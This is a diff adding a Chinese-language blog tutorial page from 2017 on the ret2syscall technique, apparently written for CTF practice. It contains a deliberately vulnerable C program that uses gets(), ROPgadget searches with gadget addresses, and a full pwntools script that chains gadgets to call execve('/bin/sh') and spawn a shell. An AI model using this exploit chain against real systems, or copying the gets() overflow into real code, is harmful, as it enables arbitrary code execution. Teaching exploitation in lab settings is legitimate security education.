@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+  <meta name="author" content="Vancir" />
+  <title>ret2syscall攻击技术示例</title>
+  <link rel="shortcut icon" href="/favicon.ico" />
+  <link href="/feed/" rel="alternate" title="Vancir" type="application/atom+xml" />
+  <link rel="stylesheet" href="/media/css/style.css" />
+  <link rel="stylesheet" href="/media/css/highlight.css" />
+  <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
+  <script type="text/javascript" src="/media/js/outliner.js"></script>
+</head>
+<!--  <body> 
+-->
+<script type="text/javascript">
+  function setTimeSpan() {
+    var date = new Date();
+    timeSpan.innerText = date.format('yyyy-MM-dd hh:mm:ss');
+  }
+
+  Date.prototype.format = function (format) {
+    var o =
+      {
+        "M+": this.getMonth() + 1, //month
+        "d+": this.getDate(),    //day
+        "h+": this.getHours(),   //hour
+        "m+": this.getMinutes(), //minute
+        "s+": this.getSeconds(), //second
+        "q+": Math.floor((this.getMonth() + 3) / 3),  //quarter
+        "S": this.getMilliseconds() //millisecond
+      }
+    if (/(y+)/.test(format))
+      format = format.replace(RegExp.$1, (this.getFullYear() + "").substr(4 - RegExp.$1.length));
+    for (var k in o)
+      if (new RegExp("(" + k + ")").test(format))
+        format = format.replace(RegExp.$1, RegExp.$1.length == 1 ? o[k] : ("00" + o[k]).substr(("" + o[k]).length));
+    return format;
+  }
+</script>
+
+<body onLoad="setInterval(setTimeSpan,1000);">
+  <div id="container">
+    <div id="main" role="main">
+      <header>
+        <h1>ret2syscall攻击技术示例</h1>
+      </header>
+      <nav id="real_nav">
+        <span>
+          <a title="home" class="" href="/">home</a>
+        </span>
+        <span>
+          <a title="categories" class="" href="/categories/">categories</a>
+        </span>
+        <span>
+          <a title="tags" class="" href="/tags/">tags</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/repo/">repo</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/act/">act</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/books/">books</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/musics/">musics</a>
+        </span>
+        <span>
+          <a title="tools" class="" href="/movies/">movies</a>
+        </span>
+        <span>
+          <a title="links" class="" href="/friends/">friends</a>
+        </span>
+        <span>
+          <a title="about" class="" href="/about/">about</a>
+        </span>
+        <span>
+          <a title="feed" class="" href="/feed">subscribe</a>
+        </span>
+      </nav>
+      <article class="content">
+        <section class="meta">
+<span class="time">
+  <time datetime="2017-08-03">2017-08-03</time>
+</span>
+
+ | 
+<span class="categories">
+  categories
+  
+  <a href="/categories/#tutorials" title="tutorials">tutorials</a>&nbsp;
+  
+</span>
+
+
+ | 
+<span class="tags">
+  tags
+  
+  <a href="/tags/#CTF" title="CTF">CTF</a>&nbsp;
+  
+  <a href="/tags/#pwn" title="pwn">pwn</a>&nbsp;
+  
+  <a href="/tags/#rop" title="rop">rop</a>&nbsp;
+  
+</span>
+
+</section>
+<section class="post">
+<h2 id="什么是ret2syscall">什么是ret2syscall</h2>
+
+<p>ret2syscall即return to system call，与ret2text和ret2shellcode类似，即在返回地址处进行<em>系统调用</em>，关于系统调用，可以阅读维基百科上的相关介绍——<a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">系统调用</a></p>
+
+<blockquote>
+  <p>Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数。操作系统实现系统调用的基本过程是：</p>
+  <ol>
+    <li>应用程序调用库函数（API）；</li>
+    <li>API 将系统调用号存入 EAX，然后通过中断调用使系统进入内核态；</li>
+    <li>内核中的中断处理函数根据系统调用号，调用对应的内核函数（系统调用）；</li>
+    <li>系统调用完成相应功能，将返回值存入 EAX，返回到中断处理函数；</li>
+    <li>中断处理函数返回到 API 中；</li>
+    <li>API 将 EAX 返回给应用程序;</li>
+  </ol>
+
+  <p>应用程序调用系统调用的过程是：</p>
+  <ol>
+    <li>把系统调用的编号存入 EAX；</li>
+    <li>把函数参数存入其它通用寄存器；</li>
+    <li>触发 0x80 号中断（int 0x80）。</li>
+  </ol>
+</blockquote>
+
+<h2 id="ret2syscall示例代码">ret2syscall示例代码</h2>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+</span>
+<span class="kt">char</span> <span class="o">*</span><span class="n">shell</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
+
+    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"This time, no system() and NO SHELLCODE!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">"What do you plan to do?</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>本节示例的漏洞程序可以从此处下载：<a href="http://od7mpc53s.bkt.clouddn.com/ret2syscall">ret2syscall</a></p>
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>那么我们现在要通过系统调用执行以下命令获得一个shell</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>那么很明显，我们需要完成的目标有如下：</p>
+
+<ul>
+  <li>获得execve的系统调用号</li>
+  <li>将execve的系统调用号赋给eax寄存器</li>
+  <li>将第一个参数”/bin/sh”的地址赋值给ebx寄存器</li>
+  <li>第二个参数NULL赋值给ecx寄存器</li>
+  <li>第三个参数NULL赋值给edx寄存器</li>
+  <li>触发 0x80 号中断(int 0x80)</li>
+</ul>
+
+<p>关于各个函数的系统调用号，我们可以根据这个手册进行查询：<a href="http://syscalls.kernelgrok.com/">Linux Syscall Reference</a></p>
+
+<p>我们可以查到execve的系统调用号为<em>0x0b</em>，而在系统调用时，eax是存放系统调用号，ebx,ecx,edx分别存放前3个参数，esi存放第4个参数，edi存放第5个参数，而Linux系统调用最多支持5个单独参数。如果实际参数超过5个，那么使用一个参数数组，并且将该数组的地址存放在ebx中。</p>
+
+<p>那么我们如何将参数传递给各个寄存器呢？其实这里是利用到了 <em>ROP(Return-oriented programming)</em> 攻击技术，其实这是一种常见的代码复用技术，通过使用程序已有的机器指令(称之为gadget，注意，是机器指令)，来劫持程序控制流。</p>
+
+<p>那么我们接下来就进行演示吧。我通常使用<em>ropgadget</em>来帮助搜索gadgets</p>
+
+<p>首先是控制eax的gadget</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ret2syscall ROPgadget <span class="nt">--binary</span> ret2syscall <span class="nt">--only</span> <span class="s1">'pop|ret'</span> | <span class="nb">grep</span> <span class="s1">'eax'</span>
+0x0809ddda : pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+0x080bb196 : pop eax <span class="p">;</span> ret
+0x0807217a : pop eax <span class="p">;</span> ret 0x80e
+0x0804f704 : pop eax <span class="p">;</span> ret 3
+0x0809ddd9 : pop es <span class="p">;</span> pop eax <span class="p">;</span> pop ebx <span class="p">;</span> pop esi <span class="p">;</span> pop edi <span class="p">;</span> ret
+</code></pre></div></div>
+
+<p>这里我们选择使用<code class="highlighter-rouge">pop eax ; ret</code>控制eax寄存器</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x080bb196 : pop eax <span class="p">;</span> ret
+</code></pre></div></div>
+
+<p>同理我们选择了下面这条gadgets，可以一次控制3个寄存器</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ret2syscall ROPgadget <span class="nt">--binary</span> ret2syscall <span class="nt">--only</span> <span class="s1">'pop|ret'</span> | <span class="nb">grep</span> <span class="s1">'ebx'</span> | <span class="nb">grep</span> <span class="s1">'ecx'</span> | <span class="nb">grep</span> <span class="s1">'edx'</span>
+0x0806eb90 : pop edx <span class="p">;</span> pop ecx <span class="p">;</span> pop ebx <span class="p">;</span> ret
+</code></pre></div></div>
+<p>接下来我们要查询<code class="highlighter-rouge">"/bin/sh"</code>以及<code class="highlighter-rouge">int 0x80</code>的地址</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ret2syscall ROPgadget <span class="nt">--binary</span> ret2syscall <span class="nt">--string</span> <span class="s2">"/bin/sh"</span>
+Strings information
+<span class="o">============================================================</span>
+0x080be408 : /bin/sh
+➜  ret2syscall ROPgadget <span class="nt">--binary</span> ret2syscall <span class="nt">--only</span> <span class="s1">'int'</span>
+Gadgets information
+<span class="o">============================================================</span>
+0x08049421 : int 0x80
+0x080938fe : int 0xbb
+0x080869b5 : int 0xf6
+0x0807b4d4 : int 0xfc
+
+Unique gadgets found: 4
+</code></pre></div></div>
+
+<p>通常我们gadget的利用方法是<code class="highlighter-rouge">address of gadget + param for register</code>，那么接下来我们可以构造对应参数进行系统调用</p>
+
+<h2 id="攻击代码">攻击代码</h2>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#encoding:utf-8</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">pop_eax_ret</span> <span class="o">=</span> <span class="mh">0x080bb196</span>
+<span class="n">pop_edx_ecx_ebx_ret</span> <span class="o">=</span> <span class="mh">0x0806eb90</span>
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x080be408</span>
+<span class="n">int_0x80</span> <span class="o">=</span> <span class="mh">0x08049421</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span> <span class="o">*</span> <span class="mi">112</span><span class="c">#用以往定位偏移的方法得到</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_eax_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0b</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edx_ecx_ebx_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span><span class="n">p32</span><span class="p">(</span><span class="n">int_0x80</span><span class="p">)</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">'ret2syscall'</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div></div>
+
+<p>这样我们就通过控制寄存器传入参数，模拟了系统调用执行<code class="highlighter-rouge">execve("/bin/sh", NULL, NULL)</code>的过程</p>
+
+</section>
+<section align="right">
+<br/>
+<span>
+	<a  href="/2017/08/03/ret2shellcode%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/" class="pageNav"  >Previous</a>
+	&nbsp;&nbsp;&nbsp;
+	<a  href="/2017/08/03/ret2text%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/" class="pageNav"  >Next</a>
+</span>
+</section>
+
+<script type="text/javascript">
+$(function(){
+  $(document).keydown(function(e) {
+    var url = false;
+        if (e.which == 37 || e.which == 74) {  // Left arrow and J
+            
+        url = 'http://localhost:4000/2017/08/03/ret2shellcode%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/';
+        
+        }
+        else if (e.which == 39 || e.which == 75) {  // Right arrow and K
+            
+        url = 'http://localhost:4000/2017/08/03/ret2text%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%A4%BA%E4%BE%8B/';
+        
+        }
+        if (url) {
+            window.location = url;
+        }
+  });
+})
+</script>
+
+      </article>
+      <a style="position:fixed;bottom:5px;right:5px;" href="#" title="Back to Top">
+        <img src="/assets/btt.png" />
+      </a>
+    </div>
+    <footer>
+      <p>
+        <small>
+          Powered by
+          <a href="http://jekyllrb.com" target="_blank">Jekyll</a> @
+          <a href="https://github.com/Vancir/vancir.github.io" target="_blank" title="project homepage">github</a> | Copyright 2017 - 2018 by
+          <a href="/about/">Vancir</a> |
+          <span class="label label-info" id="timeSpan"></span>
+        </small>
+      </p>
+    </footer>
+  </div>
+</body>
+
+</html>
